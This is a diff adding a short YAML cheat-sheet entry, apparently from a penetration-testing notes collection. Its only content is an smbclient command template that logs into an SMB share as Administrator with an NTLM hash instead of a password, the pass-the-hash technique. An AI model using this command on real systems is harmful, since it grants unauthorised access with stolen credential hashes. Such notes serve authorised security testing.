@@ -1,0 +1,9 @@
+metadata:
+  filename: "smbclient-pass-the-hash.yaml"
+  tags: ["system"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  smbclient \\\\<IP>\\<smb-folder> -U Administrator --pw-nt-hash <NTLM-hash>
+
